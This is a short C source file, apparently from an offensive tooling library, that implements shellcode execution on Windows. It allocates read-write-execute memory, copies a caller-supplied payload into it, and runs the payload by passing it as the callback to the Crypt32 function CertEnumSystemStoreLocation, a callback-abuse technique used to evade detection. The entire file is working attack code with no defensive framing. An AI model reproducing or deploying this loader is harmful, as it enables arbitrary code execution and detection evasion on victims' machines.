#include "Win32Helper.h"

DWORD UnusedSubroutineDisposeableThreadCertEnumSystemStoreLocation(LPVOID Param)
{
	PSHELLCODE_EXECUTION_INFORMATION Sei = (PSHELLCODE_EXECUTION_INFORMATION)Param;
	CERTENUMSYSTEMSTORELOCATION pCertEnumSystemStoreLocation = NULL;
	LPVOID BinAddress = NULL;
	HMODULE hModule = NULL;
	BOOL bFlag = FALSE;

	hModule = TryLoadDllMultiMethodW((PWCHAR)L"Crypt32.dll");
	if (!hModule)
		goto EXIT_ROUTINE;

	pCertEnumSystemStoreLocation = (CERTENUMSYSTEMSTORELOCATION)GetProcAddressA((DWORD64)hModule, "CertEnumSystemStoreLocation");
	if (!pCertEnumSystemStoreLocation)
		goto EXIT_ROUTINE;

	BinAddress = VirtualAlloc(NULL, Sei->dwLengthOfPayloadInBytes, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (BinAddress == NULL)
		goto EXIT_ROUTINE;

	CopyMemoryEx(BinAddress, Sei->Payload, Sei->dwLengthOfPayloadInBytes);

	if (!pCertEnumSystemStoreLocation(NULL, NULL, (PFN_CERT_ENUM_SYSTEM_STORE_LOCATION)BinAddress))
		goto EXIT_ROUTINE;

	bFlag = TRUE;

EXIT_ROUTINE:

	if (hModule)
		FreeLibrary(hModule);

	if (BinAddress)
		VirtualFree(BinAddress, 0, MEM_RELEASE);

	return (bFlag ? 0 : 0xffffffff);
}


BOOL ShellcodeExecViaCertEnumSystemStoreLocation(_In_ PSHELLCODE_EXECUTION_INFORMATION Sei)
{
	return CreateThreadAndWaitForCompletion(UnusedSubroutineDisposeableThreadCertEnumSystemStoreLocation, Sei, INFINITE);
}